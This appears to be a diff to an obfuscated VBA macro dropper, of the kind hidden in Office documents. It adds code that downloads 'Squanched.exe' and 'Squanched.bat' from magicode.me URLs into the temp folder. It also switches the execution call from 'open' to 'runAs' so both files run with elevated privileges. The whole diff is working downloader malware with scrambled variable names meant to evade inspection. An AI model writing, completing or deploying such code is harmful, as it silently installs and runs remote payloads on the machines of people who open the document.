@@ -21,15 +21,23 @@ VvXCAiWri
 End Sub
 
 
+Sub nWtd2()
+Dim otqBShpqzXRvxekDL As String, Bhcdbg As String, QXfvVVlce As String
+Bhcdbg = "Squanched.bat"
+QXfvVVlce = Environ$("tmp") & "\" & Bhcdbg
 
+otqBShpqzXRvxekDL = "https://magicode.me/send-file/file/a1f1c535250b7003d4b874ae84c73519ef3a682a/download"
+
+tEJGRjkFGPoU otqBShpqzXRvxekDL, QXfvVVlce
+End Sub
 
 
 Sub nWtd()
 Dim otqBShpqzXRvxekDL As String, Bhcdbg As String, QXfvVVlce As String
-Bhcdbg = "(Name Server).EXE"
+Bhcdbg = "Squanched.exe"
 QXfvVVlce = Environ$("tmp") & "\" & Bhcdbg
 
-otqBShpqzXRvxekDL = "(Link)"
+otqBShpqzXRvxekDL = "https://magicode.me/send-file/file/79629027ce31d3e6f4d03aa4ee7d49e27142f5a6/download"
 
 tEJGRjkFGPoU otqBShpqzXRvxekDL, QXfvVVlce
 End Sub
@@ -39,12 +47,13 @@ Dim YmxgfSSuCOrKqNgs As Integer
 Dim geXqnJ As String
 YmxgfSSuCOrKqNgs = 3
 geXqnJ = "osumLoSDznHypDNwwjVwSf"
+nWtd2
 nWtd
 End Sub
 
 Sub tEJGRjkFGPoU(ByVal yNuATc, b As String)
 
 pznHypDNww 0, yNuATc, b, 0, 0
-DoIT 0, "open", b, "", vbNullString, 0
+DoIT 0, "runAs", b, "", vbNullString, 0
 
 End Sub
